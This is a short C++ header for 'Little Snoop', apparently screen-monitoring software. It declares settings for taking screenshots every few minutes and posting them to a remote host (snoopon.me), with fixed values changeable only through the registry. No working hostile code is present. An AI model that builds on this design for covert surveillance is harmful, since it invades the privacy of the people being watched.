#pragma once



// CSnoopOptions command target

#define DEFAULT_CAPTURE_HOST	_T("snoopon.me")
#define DEFAULT_CAPTURE_PORT	80
#define DEFAULT_CAPTURE_PATH	_T("/captures")
#define DEFAULT_SETTINGS_PATH	_T("/settings")
#define DEFAULT_INSTALLED_PATH	_T("/installed")
#define DEFAULT_PORTA_PATH		_T("/porta")

#define DEFAULT_ENABLED		1
#define DEFAULT_SCHEDULE	5

class CSnoopOptions : public CObject
{
public:
	static void load();
	static void update();

	static void parseJsonSettings(CString settings);

public:
	// Not user configurable (registry edits only):
	//---------------------------------------------

	// Identifier of the copy of Little Snoop
	static CString m_sLittleSnoopId;

	// Host:port to post captured screen to (snoopon.me:80)
	static CString m_sCaptureHost;
	static int m_nCapturePort;
	static CString m_sCapturePath;
	static CString m_sSettingsPath;
	static CString m_sInstalledPath;
	static CString m_sPortaPath;

	// number of minutes till next capture (5, 10 or 30)
	static int m_nSchedule;

	static BOOL m_nEnabled;

	// The fixed width of shrinked images is 320px
	// The width of a thumbnail image is 80px
private:
	static CString generate_lsid();
};

//EOF
